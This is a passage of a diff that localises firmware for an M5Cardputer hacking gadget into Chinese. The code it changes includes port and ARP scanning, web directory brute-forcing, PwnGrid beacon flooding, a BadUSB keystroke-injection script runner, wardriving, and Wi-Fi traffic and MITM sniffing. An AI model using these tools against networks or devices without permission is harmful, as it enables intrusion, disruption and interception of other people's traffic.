     M5.Display.setCursor(5, 10);
-    M5.Display.println("Enter SSH Password:");
+    M5.Display.println("输入SSH密码:");
     ssh_password = getUserInput();
   }
   if (ssh_user.length() == 0 || ssh_host.length() == 0 || ssh_password.length() == 0) {
-    waitAndReturnToMenu("Invalid input.");
+    waitAndReturnToMenu("输入无效");
     return;
   }
 
@@ -13655,7 +13883,7 @@ void sshConnect(const char *host) {
       delay(100);
     }
   }
-  waitAndReturnToMenu("Back to menu");
+  waitAndReturnToMenu("返回菜单");
 }
 
 // Function to remove ANSI escape codes
@@ -13736,7 +13964,7 @@ void sshTask(void *pvParameters) {
   Serial.println(F("starting sshtask")); // debug here
   ssh_channel channel = my_channel;
   if (channel == NULL) {
-    M5Cardputer.Display.println("SSH Channel not open.");
+    M5Cardputer.Display.println("SSH通道未打开");
     vTaskDelete(NULL);
     return;
   }
@@ -13755,7 +13983,7 @@ void sshTask(void *pvParameters) {
   int currentLine = 0;
 
   M5Cardputer.Display.clear();
-  M5Cardputer.Display.setTextSize(1);
+  evilSetCnFont(M5Cardputer.Display, 1);
   M5Cardputer.Display.setCursor(cursorX, cursorY);
   M5Cardputer.Display.print(commandBuffer);
   M5Cardputer.Display.display();
@@ -13952,14 +14180,14 @@ void sshTask(void *pvParameters) {
 */
 void scanIpPort() {
   if (WiFi.localIP().toString() == "0.0.0.0") {
-    waitAndReturnToMenu("Not connected...");
+    waitAndReturnToMenu("未连接网络...");
     return;
   }
   M5.Display.clear();
   M5.Display.setCursor(5, 10);
-  M5.Display.println("Enter IP Address:");
+  M5.Display.println("输入IP地址:");
   M5.Display.setCursor(5, M5Cardputer.Display.height() - 20);
-  M5.Display.println("Current IP:" + WiFi.localIP().toString());
+  M5.Display.println("当前IP:" + WiFi.localIP().toString());
   scanIp = getUserInput();
 
   IPAddress ip;
@@ -13968,11 +14196,11 @@ void scanIpPort() {
   } else {
     M5.Display.clear();
     M5.Display.setCursor(5, 10);
-    M5.Display.println("Invalid IP Address");
+    M5.Display.println("无效的IP地址");
     delay(1000); // Afficher le message pendant 1 secondes
 
   }
-  waitAndReturnToMenu("Return to menu");
+  waitAndReturnToMenu("返回菜单");
 }
 
 // scan single IP end
@@ -14009,7 +14237,7 @@ static String urlBase = "";
 // ===============================
 void displayUrls() {
   M5.Display.clear();
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
   M5.Display.setCursor(5, 5);
 
   const int total = (int)urlList.size();
@@ -14162,7 +14390,7 @@ bool httpGetWithRedirectsCrawl(UrlPartsCrawl &url, int &lastCode) {
       String loc = http.getLocation();
       http.end();
 
-      if (!confirmPopup("Redirection detected.\nFollow?\n" + loc)) return false;
+      if (!confirmPopup("检测到重定向\n是否跟随?\n" + loc)) return false;
       String newAbs = resolveRedirectCrawl(cur, loc);
       UrlPartsCrawl next;
       if (!parseUrlCrawl(newAbs, next)) {
@@ -14188,7 +14416,7 @@ void webCrawling(const IPAddress &ip) { webCrawling(ip.toString()); }
 
 void webCrawling(const String &urlOrIp) {
   if (WiFi.localIP().toString() == "0.0.0.0") {
-    waitAndReturnToMenu("Not connected...");
+    waitAndReturnToMenu("未连接网络...");
     return;
   }
 
@@ -14196,15 +14424,15 @@ void webCrawling(const String &urlOrIp) {
   startIndex = 0;
   urlList.clear();
   M5.Display.setTextColor(WHITE, BLACK);
-  M5.Display.setTextSize(1);
+  evilSetCnFont(M5.Display, 1);
 
   String inputBase = urlOrIp;
   if (inputBase.isEmpty()) {
     M5.Display.clear();
     M5.Display.setCursor(5, 10);
-    M5.Display.println("Enter IP/Domain[:port]:");
+    M5.Display.println("输入IP/域名[:端口]:");
     inputBase = getUserInput();
-    M5.Display.setTextSize(1);
+    evilSetCnFont(M5.Display, 1);
   }
 
   IPAddress ipTmp;
@@ -14216,7 +14444,7 @@ void webCrawling(const String &urlOrIp) {
 
   UrlPartsCrawl base;
   if (!parseUrlCrawl(inputBase, base)) {
-    waitAndReturnToMenu("Invalid URL/IP");
+    waitAndReturnToMenu("无效的URL/IP");
     return;
   }
 
@@ -14224,16 +14452,16 @@ void webCrawling(const String &urlOrIp) {
 
   M5.Display.clear();
   M5.Display.setCursor(5, 10);
-  M5.Display.println("Testing base...");
+  M5.Display.println("正在测试基础连接...");
   int code = 0;
   bool ok = httpGetWithRedirectsCrawl(base, code);
 
   if (!ok && base.scheme == "http") {
-    if (confirmPopup("HTTP failed. Try HTTPS?")) {
+    if (confirmPopup("HTTP失败, 尝试HTTPS?")) {
       base.scheme = "https"; base.port = 443; base.path = "/";
       M5.Display.clear();
       M5.Display.setCursor(5, 10);
-      M5.Display.println("Testing HTTPS...");
+      M5.Display.println("正在测试HTTPS...");
       ok = httpGetWithRedirectsCrawl(base, code);
     }
   }
@@ -14241,9 +14469,9 @@ void webCrawling(const String &urlOrIp) {
   if (!ok) {
     M5.Display.clear();
     M5.Display.setCursor(5, 10);
-    M5.Display.println("URL not accessible.");
+    M5.Display.println("URL无法访问");
     delay(2000);
-    waitAndReturnToMenu("Returning to menu...");
+    waitAndReturnToMenu("正在返回菜单...");
     return;
   }
 
@@ -14254,9 +14482,9 @@ void webCrawling(const String &urlOrIp) {
   if (!file) {
     M5.Display.clear();
     M5.Display.setCursor(5, 10);
-    M5.Display.println("Failed open wordlist");
+    M5.Display.println("打开字典文件失败");
     delay(1200);
-    waitAndReturnToMenu("Returning to menu...");
+    waitAndReturnToMenu("正在返回菜单...");
     return;
   }
 
@@ -14275,7 +14503,7 @@ void webCrawling(const String &urlOrIp) {
     probe.path = path;
 
     M5.Display.setCursor(5, M5.Display.height() - 10);
-    M5.Display.printf("On: %s                               ", path.c_str());
+    M5.Display.printf("测试: %s                             ", path.c_str());
 
     int codeProbe = 0;
     bool okProbe = httpGetWithRedirectsCrawl(probe, codeProbe);
@@ -14287,7 +14515,7 @@ void webCrawling(const String &urlOrIp) {
 
     if (kp(KEY_ENTER)) {
       M5.Display.setCursor(5, M5.Display.height() - 10);
-      M5.Display.println("Crawling Stopped!      ");
+      M5.Display.println("爬取已停止!            ");
       enterDebounce();
       break;
     }
@@ -14296,7 +14524,7 @@ void webCrawling(const String &urlOrIp) {
   file.close();
 
   M5.Display.setCursor(5, M5.Display.height() - 10);
-  M5.Display.println("Finished Crawling!     ");
+  M5.Display.println("爬取完成!              ");
 
   while (true) {
     M5.update();
@@ -14309,8 +14537,8 @@ void webCrawling(const String &urlOrIp) {
     } else if (kp(KEY_ENTER) ||
                kp(KEY_BACKSPACE)) {
       urlBase = "";
-      M5.Display.setTextSize(1.5);
-      waitAndReturnToMenu("Returning to menu...");
+      evilSetCnFont(M5.Display, 1.5);
+      waitAndReturnToMenu("正在返回菜单...");
       break;
     }
     delay(100);
@@ -14356,12 +14584,12 @@ bool arpRequest(IPAddress host) {
 
 void scanHosts() {
   local_scan_setup();
-  waitAndReturnToMenu("Return to menu");
+  waitAndReturnToMenu("返回菜单");
 }
 
 void local_scan_setup() {
   if (WiFi.localIP().toString() == "0.0.0.0") {
-    waitAndReturnToMenu("Not connected...");
+    waitAndReturnToMenu("未连接网络...");
     return;
   }
 
@@ -14370,7 +14598,7 @@ void local_scan_setup() {
   IPAddress subnetMask;
   std::vector<IPAddress> hostslist;
   M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
 
   gatewayIP = WiFi.gatewayIP();
   subnetMask = WiFi.subnetMask();
@@ -14380,8 +14608,8 @@ void local_scan_setup() {
   M5.Display.clear();
   int numHosts = 254 - subnetMask[3];
   M5.Display.setCursor(5, M5.Display.height() / 2);
-  M5.Display.println("Probing " + String(numHosts) + " hosts with ARP");
-  M5.Display.println("       please wait...");
+  M5.Display.println("正在ARP探测 " + String(numHosts) + " 台主机");
+  M5.Display.println("       请稍候...");
 
   bool foundHosts = false;
   bool stopScan = false; // Variable pour vérifier si ENTER est pressé
@@ -14412,7 +14640,7 @@ void local_scan_setup() {
   }
 
   if (!foundHosts) {
-    M5.Display.println("No hosts found.");
+    M5.Display.println("未发现主机");
     delay(2000); // Display message for 2 seconds
     return;
   }
@@ -14537,17 +14765,17 @@ void afterScanOptions(IPAddress ip, const std::vector<IPAddress>& hostslist) {
   enterDebounce();
   std::vector<std::pair<std::string, std::function<void()>>> option;
   option = {
-    { "Scan Ports", [ = ]() {
+    { "端口扫描", [ = ]() {
         scanPorts(ip);
         displayHostOptions(hostslist); // Return to host options after port scan
       }
     },
-    { "SSH Connect", [ = ]() {
+    { "SSH连接", [ = ]() {
         sshConnect(ip.toString().c_str());
         displayHostOptions(hostslist); // Return to host options after SSH connect
       }
     },
-    { "Web Crawling", [ = ]() {
+    { "Web目录爬取", [ = ]() {
         webCrawling(ip);
         displayHostOptions(hostslist); // Return to host options after web crawling
       }
@@ -14617,11 +14845,11 @@ void scanPorts(IPAddress host) {
   const int ports[] = {20, 21, 22, 23, 25, 80, 137, 139, 443, 445, 3306, 3389, 8080, 8443, 9090};
   const int numPorts = sizeof(ports) / sizeof(ports[0]);
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setCursor(5, 20);
-  M5.Display.print("Host: " + host.toString());
+  M5.Display.print("主机: " + host.toString());
   M5.Display.setCursor(5, 34);
-  M5.Display.println("Ports Open: ");
+  M5.Display.println("开放端口: ");
   M5.Display.println("");
   for (int i = 0; i < numPorts; i++) {
     int port = ports[i];
@@ -14636,7 +14864,7 @@ void scanPorts(IPAddress host) {
     }
   }
   M5.Display.setCursor(5, M5.Display.getCursorY() + 16);
-  M5.Display.print("Finished!");
+  M5.Display.print("完成!");
   while (!kp(KEY_ENTER)) {
     M5.update();
     cardUpdate();
@@ -14792,10 +15020,10 @@ void beacon_task(void* pvParameters) {
 void displaySpamStatus() {
   enterDebounce();
   M5.Display.clear();
-  M5.Display.setTextSize(1.5);
+  evilSetCnFont(M5.Display, 1.5);
   M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
   M5.Display.setCursor(5, 10);
-  M5.Display.println("PwnGrid Spam Running...");
+  M5.Display.println("PwnGrid洪水运行中...");
 
   int current_face_index = 0;
   int current_name_index = 0;
@@ -14809,7 +15037,7 @@ void displaySpamStatus() {
 
     if (kp(KEY_ENTER)) {
       spamRunning = false;
-      waitAndReturnToMenu("Back to menu");
+      waitAndReturnToMenu("返回菜单");
       break;
     }
     if (kp('d')) {
@@ -14823,22 +15051,22 @@ void displaySpamStatus() {
 
     // Update and display current face, name, and channel
     M5.Display.setCursor(20, 30);
-    M5.Display.printf("Flood:%s", change_identity ? "1" : "0");
+    M5.Display.printf("洪水:%s", change_identity ? "1" : "0");
     M5.Display.setCursor(100, 30);
-    M5.Display.printf("DoScreen:%s", dos_pwnd ? "1" : "0");
+    M5.Display.printf("刷屏:%s", dos_pwnd ? "1" : "0");
     if (!dos_pwnd) {
       M5.Display.setCursor(5, 50);
-      M5.Display.printf("Face: \n%s                                              ", faces[current_face_index]);
+      M5.Display.printf("表情: \n%s                                              ", faces[current_face_index]);
       M5.Display.setCursor(5, 80);
-      M5.Display.printf("Name:                  \n%s                                              ", names[current_name_index]);
+      M5.Display.printf("名称:                  \n%s                                              ", names[current_name_index]);
     } else {
       M5.Display.setCursor(5, 50);
-      M5.Display.printf("Face:\nNOPWND!■■■■■■■■■■■■■■■■■");
+      M5.Display.printf("表情:\nNOPWND!■■■■■■■■■■■■■■■■■");
       M5.Display.setCursor(5, 80);
-      M5.Display.printf("Name:\n■■■■■■■■■■■■■■■■■■■■■■");
+      M5.Display.printf("名称:\n■■■■■■■■■■■■■■■■■■■■■■");
     }
     M5.Display.setCursor(5, 110);
-    M5.Display.printf("Channel: %d  ", channels[current_channel_index]);
+    M5.Display.printf("信道: %d  ", channels[current_channel_index]);
 
     // Update indices for next display
     current_face_index = (current_face_index + 1) % num_faces;
@@ -14972,11 +15200,11 @@ public:
     }
 
     displayMessage = "___________________\n\n";
-    displayMessage += "Device: \n";
+    displayMessage += "设备: \n";
     displayMessage += deviceName.length() != 0 ? deviceName.c_str() : deviceAddress.c_str();
     displayMessage += "\n\n";
     displayMessage += "RSSI: " + String(rssi) + "\n";
-    displayMessage += "Skimmer: " + String(isSkimmerDetected ? "Probable" : "No");
+    displayMessage += "盗刷器: " + String(isSkimmerDetected ? "疑似" : "否");
     displayMessage += "\n___________________";
 
     Serial.println(displayMessage);
@@ -14985,7 +15213,7 @@ public:
     if (currentTime - lastUpdate >= refreshInterval) {
       lastUpdate = currentTime;
       M5.Display.fillScreen(TFT_BLACK);
-      M5.Display.setTextSize(2);
+      evilSetCnFont(M5.Display, 2);
       M5.Display.setCursor(5, 5);
       M5.Display.setTextColor(isSkimmerDetected ? TFT_RED : menuTextUnFocusedColor);
       M5.Display.println(displayMessage);
@@ -15018,10 +15246,10 @@ void skimmerDetection() {
   pBLEScan->setWindow(449);
 
   M5.Display.fillScreen(menuBackgroundColor);
-  M5.Display.setTextSize(2);
+  evilSetCnFont(M5.Display, 2);
   M5.Display.setTextColor(menuTextUnFocusedColor);
   M5.Display.setCursor(5, 5);
-  M5.Display.println("Scanning for Skimmers...");
+  M5.Display.println("正在扫描盗刷器...");
 
   isScanning = true;
   skimmerDetected = false;
@@ -15040,7 +15268,7 @@ void skimmerDetection() {
         isBLEScanning = false;
       }
       isScanning = false;
-      waitAndReturnToMenu("Scan Stopped");
+      waitAndReturnToMenu("扫描已停止");
       return;
     }
 
@@ -15052,7 +15280,7 @@ void skimmerDetection() {
       isScanning = false;
 
       M5.Display.fillScreen(TFT_BLACK);
-      M5.Display.setTextSize(2);
+      evilSetCnFont(M5.Display, 2);
       M5.Display.setCursor(5, 5);
       M5.Display.setTextColor(TFT_RED);
       M5.Display.println(skimmerInfo);
@@ -15061,7 +15289,7 @@ void skimmerDetection() {
         M5.update();
         cardUpdate();
         if (kp(KEY_ENTER)) {
-          waitAndReturnToMenu("Skimmer Detected - Caution");
+          waitAndReturnToMenu("检测到盗刷器 - 请注意!");
           releaseBLE();
           return;
         }
@@ -15086,7 +15314,7 @@ void key_input(FS &fs, const String &bad_script) {
     File payloadFile = fs.open(bad_script, "r");
     if (payloadFile) {
       M5.Display.setCursor(5, 40);
-      M5.Display.println("from file!");
+      M5.Display.println("从文件加载!");
       String lineContent = "";
       String Command = "";
       char Cmd[15];
@@ -15098,7 +15326,7 @@ void key_input(FS &fs, const String &bad_script) {
       int line;       // Montre 3 commandes du payload sur l'écran
 
       Kb.releaseAll();
-      M5.Display.setTextSize(1);
+      evilSetCnFont(M5.Display, 1);
       M5.Display.setCursor(5, 5);
       M5.Display.fillScreen(menuBackgroundColor);
       line = 0;
@@ -15117,12 +15345,12 @@ void key_input(FS &fs, const String &bad_script) {
             if (RepeatTmp.toInt() == 0) {
               RepeatTmp = "1";
               M5.Display.setTextColor(TFT_RED);
-              M5.Display.println("REPEAT argument NaN, repeating once");
+              M5.Display.println("REPEAT参数非数字, 仅执行1次");
             }
           } else {
             RepeatTmp = "1";
             M5.Display.setTextColor(TFT_RED);
-            M5.Display.println("REPEAT without argument, repeating once");
+            M5.Display.println("REPEAT缺少参数, 仅执行1次");
           }
         } else {
           Command = lineContent.substring(0, lineContent.indexOf(' '));
@@ -15217,7 +15445,7 @@ void key_input(FS &fs, const String &bad_script) {
           if (cmdFail == 57) {
             M5.Display.setTextColor(TFT_RED);
             M5.Display.print(Command);
-            M5.Display.println(" -> Not Supported, running as STRINGLN");
+            M5.Display.println(" -> 不支持, 按STRINGLN执行");
             if (Command != Argument) {
               Kb.print(Command);
               Kb.print(" ");
@@ -15235,7 +15463,7 @@ void key_input(FS &fs, const String &bad_script) {
           if (strcmp(Cmd, "REM") != 0) delay(DEF_DELAY);  //if command is not a comment, wait DEF_DELAY until next command (100ms)
         }
       }
-      M5.Display.setTextSize(1.5);
+      evilSetCnFont(M5.Display, 1.5);
       payloadFile.close();
       Serial.println(F("Finished badusb payload execution..."));
     }
@@ -15266,7 +15494,7 @@ void showKeyboardLayoutOptions() {
         {"da-DK",       [=]() { chooseKb(KeyboardLayout_da_DK); }},
         {"hu-HU",       [=]() { chooseKb(KeyboardLayout_hu_HU); }},
     };
-    loopOptions(keyboardOptions, false, true, "Keyboard Layout");
+    loopOptions(keyboardOptions, false, true, "键盘布局");
 
     if (!kbChosen) {
         Kb.begin(KeyboardLayout_fr_FR); // Commencer avec la disposition par défaut si rien n'est choisi
@@ -15296,10 +15524,10 @@ void showScriptOptions() {
     if (scriptOptions.empty()) {
         // Affichez un message à l'utilisateur ou exécutez une action par défaut
         Serial.println(F("Aucun script disponible."));
-        M5.Display.println("Aucun script disponible.");
+        M5.Display.println("无可用脚本");
         // Vous pouvez aussi exécuter une fonction par défaut ici, si nécessaire
     } else {
-        loopOptions(scriptOptions, false, true, "Choose Script");
+        loopOptions(scriptOptions, false, true, "选择脚本");
     }
 
     // Quand un script est choisi, exécuter sa fonction
@@ -15309,7 +15537,7 @@ void showScriptOptions() {
 void runScript(const String &scriptName) {
     M5.Display.fillScreen(menuBackgroundColor);
     M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
-    M5.Display.println("Preparing");
+    M5.Display.println("准备中");
     delay(200);
 
     String bad_script = "/evil/BadUsbScript/" + scriptName;
@@ -15319,7 +15547,7 @@ void runScript(const String &scriptName) {
     }
     key_input(fs, bad_script);
 
-    M5.Display.println("Payload Sent");
+    M5.Display.println("载荷已发送");
     delay(1000);
 }
 
@@ -15327,11 +15555,11 @@ void badUSB() {
     Serial.println(F("BadUSB begin"));
     M5.Display.fillScreen(menuBackgroundColor);
     std::vector<std::pair<String, std::function<void()>>> mainOptions = {
-        {"Script on SD", []() { showScriptOptions(); }},
-        {"Keyboard Layout", []() { showKeyboardLayoutOptions(); showScriptOptions();}}
+        {"SD卡脚本", []() { showScriptOptions(); }},
+        {"键盘布局", []() { showKeyboardLayoutOptions(); showScriptOptions();}}
     };
 
-    loopOptions(mainOptions, false, true, "Main Menu");
+    loopOptions(mainOptions, false, true, "主菜单");
 
     // Attendre que l'utilisateur appuie sur "Entrée" ou "Retour arrière"
     while (!kp(KEY_ENTER) && !kp(KEY_BACKSPACE)) {
@@ -15339,7 +15567,7 @@ void badUSB() {
     }
     
     Serial.begin(115200);
-    waitAndReturnToMenu("Return to menu");
+    waitAndReturnToMenu("返回菜单");
 }
 
 // badusb end
@@ -15431,7 +15659,7 @@ void initBluetoothKeyboard() {
     M5Cardputer.Display.clear();
     M5Cardputer.Display.setTextColor(menuTextUnFocusedColor);
     M5Cardputer.Display.setCursor(0, 10);
-    M5Cardputer.Display.println("Bluetooth device name :");
+    M5Cardputer.Display.println("输入蓝牙设备名称:");
     
     String deviceName = getUserInput(); // Demander à l'utilisateur le nom de l'appareil Bluetooth
     Serial.println("Bluetooth device name selected: " + deviceName);
@@ -15478,7 +15706,7 @@ void initBluetoothKeyboard() {
     }
 
     // Retour au menu principal après la désactivation
-    waitAndReturnToMenu("Connection stopped");
+    waitAndReturnToMenu("连接已停止");
 }
 
 // Fonction pour nettoyer et désactiver le Bluetooth
@@ -15496,10 +15724,10 @@ void displayWaitingForConnection(String deviceName) {
     M5Cardputer.Display.clear();
     M5Cardputer.Display.setTextColor(TFT_BLUE);
     M5Cardputer.Display.setCursor(0, 10);
-    M5Cardputer.Display.println("Waiting on: " + deviceName);
+    M5Cardputer.Display.println("等待连接: " + deviceName);
     
-    M5Cardputer.Display.setTextSize(3);
-    const char* text = "Waiting";
+    evilSetCnFont(M5Cardputer.Display, 3);
+    const char* text = "等待中";
     int16_t textWidth = M5Cardputer.Display.textWidth(text);
     int16_t textHeight = M5Cardputer.Display.fontHeight();
     int rectWidth = textWidth + 20;
@@ -15561,8 +15789,8 @@ void keyboardLoop() {
 // Mise à jour de l'affichage du statut Bluetooth
 void updateBluetoothStatus(bool status) {
     M5Cardputer.Display.fillScreen(menuBackgroundColor);
-    M5Cardputer.Display.setTextSize(3);
-    const char* text = "Connected";
+    evilSetCnFont(M5Cardputer.Display, 3);
+    const char* text = "已连接";
     int16_t textWidth = M5Cardputer.Display.textWidth(text);
     int16_t textHeight = M5Cardputer.Display.fontHeight();
     int rectWidth = textWidth + 20;
@@ -15740,7 +15968,7 @@ void displayGeneralInfo() {
     int y = margin;
 
     // Affiche latitude, longitude, satellites et total de réseaux détectés
-    M5.Display.setTextSize(1);
+    evilSetCnFont(M5.Display, 1);
     M5.Display.setCursor(x, y);
     M5.Display.printf("Lat:%.3f|Lon:%.3f  Sat:%d  TotalN:%d",
                       gps.location.lat(),
@@ -15795,7 +16023,7 @@ void displayGeneralInfo() {
     // (3) Affiche en bas la liste des 3 SSID récents
     y += 5;
     M5.Display.setCursor(x, y);
-    M5.Display.print("Recent SSIDs:");
+    M5.Display.print("最近SSID:");
     String combined = recentSSID + ", " + recentSSID1 + ", " + recentSSID2;
     y += lineHeight;
     M5.Display.setCursor(x, y);
@@ -15817,7 +16045,7 @@ void displayReceivedData() {
         int spacing    = 2;
 
         M5.Display.setCursor(5, y);
-        M5.Display.println("Last data received:");
+        M5.Display.println("最近接收数据:");
         y += lineHeight + spacing;
 
         M5.Display.setCursor(5, y);
@@ -15831,12 +16059,12 @@ void displayReceivedData() {
         y += lineHeight + spacing;
 
         M5.Display.setCursor(5, y);
-        M5.Display.print("Encryption: ");
+        M5.Display.print("加密: ");
         M5.Display.println(myData.encryptionType);
         y += lineHeight + spacing;
 
         M5.Display.setCursor(5, y);
-        M5.Display.print("Channel: ");
+        M5.Display.print("信道: ");
         M5.Display.println(myData.channel);
         y += lineHeight + spacing;
 
@@ -15846,17 +16074,17 @@ void displayReceivedData() {
         y += lineHeight + spacing;
 
         M5.Display.setCursor(5, y);
-        M5.Display.print("Lat: ");
+        M5.Display.print("纬度: ");
         M5.Display.println(gps.location.lat(), 8);
         y += lineHeight + spacing;
 
         M5.Display.setCursor(5, y);
-        M5.Display.print("Lon: ");
+        M5.Display.print("经度: ");
         M5.Display.println(gps.location.lng(), 8);
         y += lineHeight + spacing;
 
         M5.Display.setCursor(5, y);
-        M5.Display.print("Altitude: ");
+        M5.Display.print("海拔: ");
         M5.Display.println(gps.altitude.meters());
         y += lineHeight + spacing;
 
@@ -15909,7 +16137,7 @@ void loopwardrivingmaster() {
     if (kp(KEY_BACKSPACE)) {
         Serial.println(F("Exiting Wardriving Master mode..."));
         stopEspNow();
-        waitAndReturnToMenu("Returning to menu...");
+        waitAndReturnToMenu("正在返回菜单...");
     }
 
     // (6) Délai “intelligent” pour lire GPS et maintenir l’UI réactive
@@ -15958,7 +16186,7 @@ void startWardivingMaster() {
         if (kp(KEY_BACKSPACE)) {
             Serial.println(F("Exiting Wardriving Master mode..."));
             stopEspNow();
-            waitAndReturnToMenu("Returning to menu...");
+            waitAndReturnToMenu("正在返回菜单...");
             break;
         }
     }
@@ -16149,9 +16377,9 @@ void displayStatus(){
   if(total != lastTotalReceived){
     M5.Display.fillRect(0, 0, 240, 10, menuBackgroundColor);
     M5.Display.setCursor(5, 5);
-    M5.Display.setTextSize(1);
+    evilSetCnFont(M5.Display, 1);
     M5.Display.setTextColor(menuTextUnFocusedColor, menuBackgroundColor);
-    M5.Display.printf("Total Frames: %d", total);
+    M5.Display.printf("总帧数: %d", total);
     lastTotalReceived = total;
   }
 
@@ -16190,7 +16418,7 @@ void displayStatus(){
     M5.Display.fillRect(0, y, 240, 10, menuBackgroundColor);
     M5.Display.setCursor(5, y);
     M5.Display.setTextColor(menuTextUnFocusedColor);
-    M5.Display.printf("Last SSID : %s", lastSSIDMasterSniffer);
+    M5.Display.printf("最近SSID: %s", lastSSIDMasterSniffer);
     M5.Display.display();
     lastShown = lastSSIDMasterSniffer;
   }
@@ -16204,7 +16432,7 @@ void sniffMaster(){
   enterDebounce();
 
   q = (frag_item_t*)malloc(QUEUE_LEN * sizeof(frag_item_t));
-  if (!q) { waitAndReturnToMenu("Frag alloc failed"); return; }
+  if (!q) { waitAndReturnToMenu("分片内存分配失败"); return; }
   memset(q, 0, QUEUE_LEN * sizeof(frag_item_t));
 
   memset(received_len,0,sizeof(received_len));
@@ -16238,7 +16466,7 @@ void sniffMaster(){
   esp_now_unregister_recv_cb(); esp_now_deinit();
   if(pcapFile) pcapFile.close();
   free(q); q = nullptr;
-  waitAndReturnToMenu("Returning to menu...");
+  waitAndReturnToMenu("正在返回菜单...");
 }
 
 
@@ -16264,11 +16492,11 @@ void wifiVisualizer() {
     enterDebounce();
 
     M5.Display.clear(menuBackgroundColor);
-    M5.Display.setTextSize(1);
-    M5.Display.setTextFont(1);
+    evilSetCnFont(M5.Display, 1);
+    evilKeepCnFont(M5.Display);
     M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
     M5.Display.setCursor(screenWidth / 2 - 30, screenHeight / 2 - 10);
-    M5.Display.printf("Scanning...");
+    M5.Display.printf("扫描中...");
     M5.Display.display();
 
     static int colors[] = {TFT_WHITE, TFT_RED, TFT_PINK, TFT_ORANGE, TFT_YELLOW, TFT_GREENYELLOW, TFT_GREEN, TFT_DARKGREEN, TFT_CYAN, TFT_BLUE, TFT_NAVY, TFT_PURPLE, TFT_MAROON, TFT_MAGENTA};
@@ -16326,8 +16554,8 @@ void wifiVisualizer() {
             if (scaleMax < 5) scaleMax = 5;
 
             M5.Display.clear(menuBackgroundColor);
-            M5.Display.setTextSize(1);
-            M5.Display.setTextFont(1);
+            evilSetCnFont(M5.Display, 1);
+            evilKeepCnFont(M5.Display);
 
             M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
             for (int i = 0; i <= 5; i++) {
@@ -16565,7 +16793,7 @@ void allTrafficSniffer() {
   M5.Lcd.clear();
   M5.Lcd.setTextColor(menuTextFocusedColor);
   M5.Lcd.setCursor(3, 0);
-  M5.Lcd.println("Sniffing Raw on :");
+  M5.Lcd.println("原始流量抓包于:");
   M5.Lcd.println(filename);
 
   bool exitSniff = false;
@@ -16582,14 +16810,14 @@ void allTrafficSniffer() {
 
     M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
     M5.Lcd.setCursor(0, 25);
-    M5.Lcd.printf("     < [Channel]: %d > \n", currentChannel);
+    M5.Lcd.printf("     < [信道]: %d > \n", currentChannel);
     M5.Lcd.setCursor(0, 42);
-    M5.Lcd.printf("[Beacon]      : %d\n", beaconCount);
+    M5.Lcd.printf("[信标帧]      : %d\n", beaconCount);
     M5.Lcd.printf("[EAPOL]       : %d\n", eapolCount);
-    M5.Lcd.printf("[Deauth]      : %d\n", deauthCountSniff);
-    M5.Lcd.printf("[ProbeReq]    : %d\n", probeReqCount);
-    M5.Lcd.printf("[ProbeResp]   : %d\n", probeRespCount);
-    M5.Lcd.printf("[Total]       : %d\n", packetSavedCount);
+    M5.Lcd.printf("[去认证]      : %d\n", deauthCountSniff);
+    M5.Lcd.printf("[探测请求]    : %d\n", probeReqCount);
+    M5.Lcd.printf("[探测响应]    : %d\n", probeRespCount);
+    M5.Lcd.printf("[总计]        : %d\n", packetSavedCount);
     M5.Lcd.setCursor(0, M5.Display.height() - 16);
 
     // Cursor blinking every second
@@ -16604,7 +16832,7 @@ void allTrafficSniffer() {
     if (isPaused) {
       M5.Lcd.setCursor(M5.Lcd.width() - 70, M5.Lcd.height() - 12);
       M5.Lcd.setTextColor(WHITE, RED);
-      M5.Lcd.print(" PAUSE ");
+      M5.Lcd.print(" 已暂停 ");
     } else{
       M5.Lcd.setCursor(M5.Lcd.width() - 80, M5.Lcd.height() - 12);
       M5.Lcd.setTextColor(menuTextFocusedColor, TFT_BLACK);
@@ -16647,7 +16875,7 @@ void allTrafficSniffer() {
   // Close the file
   sniffFile.close();
   Serial.println(F("Stopped all traffic sniffer, file closed."));
-  waitAndReturnToMenu("Stopping Sniffing...");
+  waitAndReturnToMenu("正在停止抓包...");
 }
 
 
@@ -16745,7 +16973,7 @@ void TrafficMITMCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
 
 void sniffNetwork() {
   if (getConnectedPeopleCount() == 0) {
-    waitAndReturnToMenu("No client connected..");
+    waitAndReturnToMenu("无已连接客户端..");
     return;
   }
   Serial.println(F("Resetting packet counters..."));
@@ -16775,7 +17003,7 @@ void sniffNetwork() {
   M5.Lcd.clear();
   M5.Lcd.setTextColor(menuTextFocusedColor);
   M5.Lcd.setCursor(3, 0);
-  M5.Lcd.println("Sniffing Raw on :");
+  M5.Lcd.println("原始流量抓包于:");
   M5.Lcd.println(filename);
 
   bool exitSniff = false;
@@ -16796,7 +17024,7 @@ void sniffNetwork() {
       int centerX = 240 / 2 - (10 * strlen("No clients connected")) / 2;
       int centerY = 135 / 2 - 8;
       M5.Lcd.setCursor(centerX, centerY);
-      M5.Lcd.println("No more clients...");
+      M5.Lcd.println("客户端已全部断开...");
       vTaskDelay(pdMS_TO_TICKS(2000));
       exitSniff = true;
       continue;
@@ -16807,7 +17035,7 @@ void sniffNetwork() {
 
     M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
     M5.Lcd.setCursor(0, 25);
-    M5.Lcd.printf("[Total]       : %d\n", packetSavedCount);
+    M5.Lcd.printf("[总计]        : %d\n", packetSavedCount);
     M5.Lcd.setCursor(0, M5.Display.height() - 16);
 
     if (currentTime - lastCursorBlinkTime >= 1000) {
@@ -16829,7 +17057,7 @@ void sniffNetwork() {
 
   sniffFile.close();
   Serial.println(F("Stopped all traffic sniffer, file closed."));
-  waitAndReturnToMenu("Stopping Sniffing...");
+  waitAndReturnToMenu("正在停止抓包...");
 }
 
 
@@ -16869,7 +17097,7 @@ void logScanResult(String result) {
         String filePath = scanFolder + "/" + String(fileIndex) + ".txt";  // Create a new file path with the next index
